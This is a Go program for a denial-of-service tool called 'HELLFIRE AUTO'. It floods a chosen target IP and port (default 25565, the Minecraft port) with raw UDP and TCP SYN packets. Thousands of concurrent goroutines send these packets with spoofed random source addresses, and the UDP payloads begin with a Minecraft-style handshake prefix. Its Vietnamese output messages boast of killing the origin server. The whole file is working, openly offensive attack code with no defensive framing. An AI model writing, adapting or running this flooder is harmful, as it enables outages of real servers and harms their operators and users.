package main

import (
	"flag"
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

var (
	target    = flag.String("target", os.Getenv("TARGET"), "Target IP/domain")
	portStr   = flag.String("port", os.Getenv("PORT"), "Port")
	floodType = flag.String("type", os.Getenv("TYPE"), "udp/syn/both")
	udp       = flag.Int("udp", 8000, "UDP threads")
	syn       = flag.Int("syn", 4000, "SYN threads")
	duration  = flag.Int("duration", 600, "Duration seconds")
	iface     = flag.String("iface", "eth0", "Network interface")
)

func main() {
	flag.Parse()
	port := 25565
	if *portStr != "" {
		fmt.Sscanf(*portStr, "%d", &port)
	}
	if *target == "" || *floodType == "" {
		fmt.Println("Thiếu TARGET hoặc TYPE từ env!")
		os.Exit(1)
	}

	fmt.Printf("HELLFIRE AUTO: %s:%d | %s | UDP:%d SYN:%d | %ds 🔥\n", *target, port, *floodType, *udp, *syn, *duration)

	stop := make(chan struct{})
	go func() {
		sig := make(chan os.Signal, 1)
		signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
		<-sig
		close(stop)
	}()

	if *floodType == "udp" || *floodType == "both" {
		for i := 0; i < *udp; i++ {
			go udpFlood(stop, *target, port, i)
		}
	}
	if *floodType == "syn" || *floodType == "both" {
		for i := 0; i < *syn; i++ {
			go synFlood(stop, *target, port, i)
		}
	}

	<-stop
	fmt.Println("Hellfire finished! Origin chết queo! 😈")
}

func udpFlood(stop chan struct{}, target string, port int, id int) {
	handle, _ := pcap.OpenLive(*iface, 65535, true, pcap.BlockForever)
	defer handle.Close()
	for {
		select {
		case <-stop:
			return
		default:
			payload := make([]byte, 1024+rand.Intn(2048))
			rand.Read(payload)
			payload = append([]byte{0x0F, 0x00, 0x09, 0x6C, 0x6F, 0x63, 0x61, 0x6C, 0x68, 0x6F, 0x73, 0x74}, payload...)
			buf := gopacket.NewSerializeBuffer()
			ip := &layers.IPv4{SrcIP: net.ParseIP(randomIP()), DstIP: net.ParseIP(target), Protocol: layers.IPProtocolUDP}
			udp := &layers.UDP{SrcPort: layers.UDPPort(rand.Intn(65535)), DstPort: layers.UDPPort(port)}
			udp.SetNetworkLayerForChecksum(ip)
			gopacket.SerializeLayers(buf, gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}, ip, udp, gopacket.Payload(payload))
			handle.WritePacketData(buf.Bytes())
			time.Sleep(time.Microsecond * time.Duration(rand.Intn(150)))
		}
	}
}

func synFlood(stop chan struct{}, target string, port int, id int) {
	handle, _ := pcap.OpenLive(*iface, 65535, true, pcap.BlockForever)
	defer handle.Close()
	for {
		select {
		case <-stop:
			return
		default:
			buf := gopacket.NewSerializeBuffer()
			ip := &layers.IPv4{SrcIP: net.ParseIP(randomIP()), DstIP: net.ParseIP(target), Protocol: layers.IPProtocolTCP}
			tcp := &layers.TCP{SrcPort: layers.TCPPort(rand.Intn(65535)), DstPort: layers.TCPPort(port), SYN: true, Window: 65535, Seq: rand.Uint32()}
			tcp.SetNetworkLayerForChecksum(ip)
			gopacket.SerializeLayers(buf, gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}, ip, tcp)
			handle.WritePacketData(buf.Bytes())
			time.Sleep(time.Microsecond * time.Duration(rand.Intn(250)))
		}
	}
}

func randomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256))
}